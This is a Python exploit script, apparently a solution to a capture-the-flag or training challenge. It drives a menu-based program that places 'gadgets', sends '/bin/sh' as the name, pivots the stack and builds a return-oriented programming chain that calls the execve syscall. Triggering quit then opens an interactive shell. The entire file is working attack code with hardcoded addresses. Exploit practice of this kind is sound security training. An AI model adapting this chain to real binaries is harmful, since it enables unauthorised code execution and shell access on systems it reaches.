import interact 

p = interact.Process()

p.readuntil('[*] Enter your name')
p.sendline('/bin/sh\x00')

# stack pivoting
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("6")
p.readuntil("What index should the gadget be placed at?")
p.sendline("88")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("96")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x7fffffffed80")


# binsh pointer
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("1")
p.readuntil("What index should the gadget be placed at?")
p.sendline("0")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("8")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x603120")

# argv = 0
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("2")
p.readuntil("What index should the gadget be placed at?")
p.sendline("16")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("24")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x0")

# envp = 0
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("3")
p.readuntil("What index should the gadget be placed at?")
p.sendline("32")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("40")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x0")

# syscall number for execve
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("4")
p.readuntil("What index should the gadget be placed at?")
p.sendline("48")
p.readuntil("Choice:")
p.sendline("3")
p.readuntil("[*] Enter Index:")
p.sendline("56")
p.readuntil("[*] Enter Number (In Hex):")
p.sendline("0x3b")

# call syscall
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("5")
p.readuntil("What index should the gadget be placed at?")
p.sendline("64")

# Setting return 
p.readuntil("Choice:")
p.sendline("1")
p.readuntil("7. Add Gadget: { ret }")
p.sendline("7")
p.readuntil("What index should the gadget be placed at?")
p.sendline("72")


# calling quit to trigger the ROP chain
p.readuntil("Choice:")
p.sendline("5")


p.interactive()